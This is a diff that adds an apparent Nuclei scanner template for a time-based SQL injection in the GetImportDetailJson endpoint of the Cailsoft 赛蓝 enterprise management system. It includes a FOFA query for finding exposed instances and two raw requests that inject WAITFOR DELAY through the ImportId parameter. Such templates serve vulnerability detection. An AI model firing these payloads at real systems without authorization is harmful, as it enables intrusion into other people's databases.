@@ -1,0 +1,32 @@
+id: sailan-GetImportDetailJson-sql
+
+info:
+  name: 赛蓝企业管理系统 GetImportDetailJson SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+      - |
+        GET /BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+
